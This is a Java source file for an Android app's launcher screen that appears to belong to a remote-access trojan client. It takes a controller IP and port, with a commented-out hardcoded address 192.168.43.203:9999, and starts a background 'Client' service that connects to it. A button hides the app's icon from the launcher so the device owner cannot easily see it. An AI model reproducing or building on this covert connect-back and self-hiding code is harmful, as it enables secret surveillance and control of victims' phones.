package my.app.client;

import android.content.ComponentName;
import android.content.pm.PackageManager;
import my.app.client.R;
import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

public class LauncherActivity extends Activity {
    /** Called when the activity is first created. */
	public void hideAppIcon(){
        PackageManager p = getPackageManager();
        p.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

	Intent Client, ClientAlt;
	Button btnStart, btnStop,hideApp;
	EditText ipfield, portfield;
    @Override
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.main);

        Client = new Intent(this, Client.class);
        Client.setAction(LauncherActivity.class.getName());
        
        btnStart = (Button) findViewById(R.id.buttonstart);
        btnStop = (Button) findViewById(R.id.buttonstop);
        hideApp = (Button) findViewById(R.id.hideapp);

        ipfield = (EditText) findViewById(R.id.ipfield);
        portfield = (EditText) findViewById(R.id.portfield);
//
//        Client.putExtra("IP", "192.168.43.203");
//        Client.putExtra("PORT", 9999);
//        startService(Client);
//        btnStart.setEnabled(false);
//        btnStop.setEnabled(true);

        btnStart.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                Client.putExtra("IP", ipfield.getText().toString());
            	Client.putExtra("PORT", Integer.valueOf(portfield.getText().toString()));
                startService(Client);
                btnStart.setEnabled(false);
                btnStop.setEnabled(true);
//                finish();

            }
        });

        btnStop.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {             
                stopService(Client);  
                btnStart.setEnabled(true);
                btnStop.setEnabled(false);
                //finish(); 
            }
        });
        hideApp.setOnClickListener(new View.OnClickListener() {
            public void onClick(View view) {
                hideAppIcon();
            }
        });
    }
}